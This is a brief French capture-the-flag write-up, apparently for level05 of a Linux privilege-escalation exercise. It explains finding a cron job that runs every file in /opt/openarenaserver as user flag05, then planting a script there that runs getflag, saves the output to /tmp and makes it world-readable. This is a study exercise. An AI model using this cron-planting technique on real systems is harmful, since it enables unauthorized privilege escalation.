@@ -1,0 +1,25 @@
+En se connectant, on voit un message comme quoi on a un mail (?!).
+
+On va dans /var/mail et on voit ceci :
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+Ceci ressemble a une ligne d'un crontab qui va executer  sh /usr/sbin/openarenaserver en tant que flag05 toutes les deux minutes.
+
+Le contentu d'openarenaserver est :
+
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+
+On voit que cela va executer chaque fichier dans le dossier /opt/openarenaserver avec bash
+
+on met cela comme fichier :
+
+#!/bin/sh
+getflag > /tmp/pouet
+chmod 777 /tmp/pouet
+
+On attent que le cron passe, et on recupere le flag.
